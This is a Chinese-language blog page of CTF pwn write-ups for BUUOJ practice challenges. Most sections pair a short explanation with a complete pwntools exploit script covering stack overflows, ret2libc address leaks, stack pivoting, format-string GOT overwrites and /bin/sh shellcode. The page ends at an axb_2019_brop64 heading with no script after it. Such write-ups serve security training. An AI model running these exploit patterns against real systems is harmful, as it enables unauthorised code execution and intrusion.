<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029861.png" alt="image-20240125154908898"></p>
<h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a><code>xdctf2015_pwn200</code></h2><p>​	本题是<code>32</code>位栈溢出，有<code>write</code>函数可以泄漏l<code>ibc</code>。第一次接收地址的时候我是这样写的<code>writer_addr = u32(p.recv(4))</code>，不过没打通。后来我直接发送第一个<code>payload</code>，发现后面的<code>Welcome to XDCTF2015~!</code>也会跟着输出。而虽然每次泄漏的地址都不一样，但是最后都是<code>\xf7</code>，因此我们可以这样<code>write_addr = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])</code>接收地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029869.png" alt="image-20240125165043728"></p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28197</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(sys_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029021.png" alt="image-20240125164748067"></p>
<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a><code>jarvisoj_level4</code></h2><p>​	本题<code>write</code>函数泄漏<code>libc</code>地址，覆盖返回地址为<code>system</code>地址。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from pwn import *</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26210)</span></span><br><span class="line">p = process(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">paylaod = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(paylaod)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029635.png" alt="image-20240119194655287"></p>
<h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a><code>wustctf2020_getshell</code></h2><p>​	本题有<code>system(&quot;/bin/sh&quot;)</code>，栈溢出字节足够长，直接覆盖返回地址为<code>shell_addr</code>即可。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27320</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./wu&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x0804851b</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(shell_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029656.png" alt="image-20240123111559367"></p>
<h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>​	本题<code>gets</code>函数可以栈溢出，<code>flag</code>就在<code>win</code>函数中，直接覆盖返回地址为<code>win</code>函数地址，读出<code>flag</code>。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029633.png" alt="image-20240123154139779"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029302.png" alt="image-20240123154205692"></p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27396</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pico&#x27;)</span></span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x080485cb</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(win_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029446.png" alt="image-20240123153340109"></p>
<h2 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a><code>jarvisoj_test_your_memory</code></h2><p>​	本题程序中有<code>system</code>函数，有<code>cat flag</code>字符串找到其地址，栈溢出字节长度足够，直接覆盖为<code>system</code>的<code>plt</code>地址再传参即可。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29919</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./memory&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./memory&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">cat_flag = <span class="number">0x080487e0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>+<span class="number">4</span>)+p32(sys_addr)+p32(main_addr)+p32(cat_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029905.png" alt="image-20240123180902886"></p>
<h2 id="bbys-tu-2016"><a href="#bbys-tu-2016" class="headerlink" title="bbys_tu_2016"></a><code>bbys_tu_2016</code></h2><p>​	这道题就是普通的<code>ret2text</code>，不过在<code>ida</code>中算的偏移量没打通，后来用<code>gdb</code>调试算出来的偏移量打通了。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029529.png" alt="image-20240124200428317"></p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28883</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./bbys&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bbys&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x0804856d</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030018.png" alt="image-20240124201037982"></p>
<h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><p>​	这道题用栈迁移跟前面<code>ciscn_2019_es_2</code>这道题一模一样，我直接放<code>exp</code>了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27055</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./es2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./s4&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">36</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(ebp))</span></span><br><span class="line"></span><br><span class="line">binsh_addr = ebp-<span class="number">0x28</span></span><br><span class="line">stack_addr = ebp-<span class="number">0x38</span></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x080485FD</span></span><br><span class="line">payload = (<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_plt)+p32(<span class="number">0</span>)+p32(binsh_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(stack_addr)  </span><br><span class="line">payload += p32(leave_ret_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030160.png" alt="image-20240126140555782"></p>
<h2 id="jarvisoj-level1"><a href="#jarvisoj-level1" class="headerlink" title="jarvisoj_level1"></a><code>jarvisoj_level1</code></h2><p>​	本题中<code>buf136</code>个字节，<code>read</code>可以读入<code>0x100</code>个字节，可以栈溢出。没有开<code>NX,Canary,PIE</code>保护，没有<code>system</code>函数和<code>/bin/sh</code>字符串，有<code>write</code>函数，可以泄漏<code>write</code>或者<code>read</code>函数地址，算出<code>libc</code>基地址。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./level1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28794</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(sys_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030296.png" alt="image-20240128120025974"></p>
<h2 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a><code>wdb_2018_2nd_easyfmt</code></h2><p>​	我们看到<code>read</code>函数可以读入<code>0x64(100)</code>个字节，不能栈溢出，<code>printf(buf)</code>明显的格式化字符串漏洞。程序中没有<code>system</code>函数和<code>/bin/sh</code>，可以利用<code>printf</code>泄漏<code>libc</code>地址，再修改<code>printf</code>的<code>got</code>表值为<code>system</code>函数的地址。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030775.png" alt="image-20240130125244516"></p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29775</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = p32(printf_got)+<span class="string">b&#x27;aaaa&#x27;</span>+<span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">base = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys = base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">paylaod = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:sys&#125;)</span><br><span class="line">p.sendline(paylaod)</span><br><span class="line">binsh = base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#p.sendline(b&#x27;/bin/sh&#x27;)</span></span><br><span class="line">p.sendline(p32(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030262.png" alt="image-20240130130151955"></p>
<h2 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a><code>picoctf_2018_shellcode</code></h2><p>​	本题直接发送<code>shellcode</code>即可，<code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27092</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030893.png" alt="image-20240207145255883"></p>
<h2 id="jarvisoj-level5"><a href="#jarvisoj-level5" class="headerlink" title="jarvisoj_level5"></a><code>jarvisoj_level5</code></h2><p>​	保护只开了<code>NX</code>，分析函数代码，可以栈溢出，程序中没有后门函数，有<code>write</code>函数。大概思路就是泄漏利用<code>write</code>函数泄漏<code>libc</code>基址，获得<code>system</code>函数和<code>/bin/sh</code>的地址，构造<code>paylaod</code>攻击。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25913</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(<span class="number">0x4006b3</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x4006b1</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">base = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys = base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(<span class="number">0x4006b3</span>)+p64(binsh)+p64(sys)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030776.png" alt="image-20240209122021165"></p>
<h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><code>suctf_2018_basic pwn</code></h2><p>​	一个简单的<code>ret2text</code>，这道题真是太简单了，好久没写过这样的了，我就喜欢傻瓜题。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.buuoj.cn&#x27;,26457)</span></span><br><span class="line">p = process(<span class="string">&#x27;./basic&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>+<span class="number">8</span>)+p64(<span class="number">0x401157</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030677.png" alt="image-20240210013038614"></p>
<h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a><code>inndy_echo</code></h2><p>​	分析程序，有格式化字符串漏洞，有<code>system</code>函数，<code>32</code>位程序，直接劫持<code>got</code>表即可。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from pwn import *</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./echo&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26312</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]:elf.plt[<span class="string">&#x27;system&#x27;</span>]&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a><code>cmcc_pwnme1</code></h2><p>​	<code>32</code>位程序，<code>NX,canary,PIE</code>保护都没开，主函数中有一个<code>getfruit</code>函数，其中<code>__isoc99_scanf(&quot;%s&quot;, v1);</code>可以栈溢出，程序中也有输出函数，大概思路是泄漏<code>puts</code>函数的地址，然后得到<code>system</code>和<code>/bin/sh</code>的地址。一道普通的<code>ret2libc</code>。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwnme1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27869</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwnme1&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so-32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_addr = <span class="number">0x08048624</span></span><br><span class="line">p.send(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(puts_plt)+p32(get_addr)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;...\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_libc = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line">system_addr = base_libc+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_addr = base_libc+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030003.png" alt="image-20240224121656401"></p>
<h2 id="axb-2019-brop64"><a href="#axb-2019-brop64" class="headerlink" title="axb_2019_brop64"></a><code>axb_2019_brop64</code></h2><p>​	<code>64</code>位程序，没开<code>canary,PIE</code>保护，可以栈溢出有输出函数直接<code>ret2libc</code>。</p>
<p><code>exp</code>如下：</p>
